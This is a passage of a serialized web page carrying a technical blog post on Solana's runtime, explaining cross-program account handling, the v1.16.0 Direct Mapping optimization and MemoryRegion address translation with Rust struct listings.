border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" always holds valid account state for subsequent programs in the call chain.\"]}],\"\\n\",[\"$\",\"h4\",\"h4-5\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 2: Memory Buffer Management\"}],\"\\n\",[\"$\",\"p\",\"p-48\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Account data may grow during Program B's execution when the program calls \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"realloc()\"}],\" to expand account storage. This happens when programs need to add new data fields, grow vectors, store additional state information, or allocate space for user data like NFT metadata. To handle this growth efficiently, the runtime reserves extra padding beyond the current data length when accounts are initially serialized into Program A's VM memory. This reserved space avoids expensive reallocation during execution. If Program B's growth exceeds the reserved padding, the transaction immediately reverts.\"]}],\"\\n\",[\"$\",\"h4\",\"h4-6\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 3: Update Caller and Resume Execution\"}],\"\\n\",[\"$\",\"p\",\"p-49\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Validated account states from the shared cache are copied back into Program A's VM memory \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" region. The runtime uses \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"CallerAccount\"}],\" structures with their mutable references to efficiently update Program A's serialized account data.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-10\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"The Performance Problem\"}],\"\\n\",[\"$\",\"p\",\"p-50\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Consider a typical DeFi swap with 4 nested program calls, each handling 10KB of account data. In the legacy model, each CPI call requires serializing this data into the callee's VM, then copying it back on return. For our 4-level call chain, this means 40KB of serialization going down and 40KB of copying back up, totaling 80KB of memory operations for a single transaction.\"}],\"\\n\",[\"$\",\"p\",\"p-51\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"For a high-throughput blockchain processing thousands of complex transactions per second, this overhead becomes the performance bottleneck. Validators spent more time copying memory than executing actual program logic.\"}],\"\\n\",[\"$\",\"p\",\"p-52\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Solana needed a better runtime.\"}],\"\\n\",[\"$\",\"h2\",\"h2-5\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"The Optimization That Broke Everything: Direct Mapping (v1.16.0)\"}],\"\\n\",[\"$\",\"p\",\"p-53\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"In Solana version 1.16.0, an optimization known as \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"Direct Mapping\"}],\" was introduced to address the performance issues arising from repetitive serialization and deserialization of large account data. Instead of creating separate copies of account data in the VM's INPUT region, Direct Mapping exposes the host's actual account data buffers directly to the VM, allowing programs to read and write the same memory that the host uses to store account state. This optimization is only applied to the account data field, and not other fields such as account owner or lamport. The justification is that all other fields are relatively small is size, and the overhead of the optimization might outweigh the performance gained. Only the data field is large enough to justify such optimizations.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-11\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"MemoryRegion: The Foundation of VM Address Translation\"}],\"\\n\",[\"$\",\"p\",\"p-54\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Since we're preparing to map host memory into the virtual guest memory space, it's crucial to explain how Solana manages guest virtual memory.\"}],\"\\n\",[\"$\",\"p\",\"p-55\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The VM and host operate in separate address spaces. When a program running in the VM accesses memory at address \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"0x400000000\"}],\", this virtual address must be translated to an actual host memory location. Solana handles this translation through \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" structures:\"]}],\"\\n\",[\"$\",\"pre\",\"pre-6\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryRegion\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" host_addr\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cell\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// start host address\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"             \"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// start virtual address\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr_end\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"         \"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// end virtual address\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" len\"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                 \"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Length in bytes\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_gap_shift\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"         \"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Address translation parameters\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" is_writable\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Permission tracking\"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-56\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Each \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" maps a range of VM virtual addresses to host memory addresses. When the VM accesses memory, the runtime looks up the appropriate \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" and translates the virtual address to the corresponding host address.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-12\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Legacy Model: Single MemoryRegion\"}],\"\\n\",[\"$\",\"p\",\"p-57\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"In the legacy model, all account data was packed into one large serialized blob in the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" region, managed by a single \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\":\"]}],\"\\n\",[\"$\",\"pre\",\"pre-7\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"VM Address Range: 0x400000000 - 0x400100000\\nHost Address: Points to serialized account data buffer\\nState: Writable\\n\"}]}],\"\\n\",[\"$\",\"p\",\"p-58\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"This single \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" contained all serialized account data in one contiguous buffer.\"]}],\"\\n\",[\"$\",\"p\",\"p-59\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"/blog/2025_06_27/legacy_memoryregion.png\",\"alt\":\"Legacy MemoryRegion\"}]}],\"\\n\",[\"$\",\"h3\",\"h3-13\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Direct Mapping: Multiple MemoryRegions per Account\"}],\"\\n\",[\"$\",\"p\",\"p-60\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Direct Mapping fundamentally changes this architecture. Instead of creating separate copies of account data in a serialized buffer, Direct Mapping creates individual \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" for each account that point directly to the host's \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" buffers. When a program accesses \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"account.data\"}],\", the VM translates this access through the account's specific \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" to read or write the same memory buffer that the host uses to store the account state, eliminating the copying step entirely.\"]}],\"\\n\",[\"$\",\"p\",\"p-61\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"/blog/2025_06_27/new_memoryregion.png\",\"alt\":\"Legacy MemoryRegion\"}]}],\"\\n\",[\"$\",\"p\",\"p-62\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The diagram above shows this architectural shift: from one large \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" containing serialized copies to multiple \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegions\"}],\" pointing directly to host account buffers.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-14\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Changes to the MemoryRegion Structure\"}],\"\\n\",[\"$\",\"p\",\"p-63\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"And just by this, we just got rid of the need for excessive copies! Sounds too good to be true, right?\"}],\"\\n\",[\"$\",\"p\",\"p-64\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The optimization comes at a cost. Most noteably, Direct Mapping breaks the fundamental execution model that Solana previously relied upon. In the legacy model, programs could freely modify their VM memory because changes only affected local copies - validation happened afterward before committing to the host. With Direct Mapping, this approach no longer works because every VM write directly affects the actual account state recorded in the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" within \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\" immediately. This forces Solana to implement immediate permission validation on every memory access.\"]}],\"\\n\",[\"$\",\"p\",\"p-65\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"But what checks must be done? Is read and write checks sufficient? The answer, unfortunately, is no. We'll start with presenting the changes to the MemoryRegion structure, and work our way back to the reasons behind the change.\"}],\"\\n\",[\"$\",\"pre\",\"pre-8\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryRegion\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" host_addr\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cell\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token 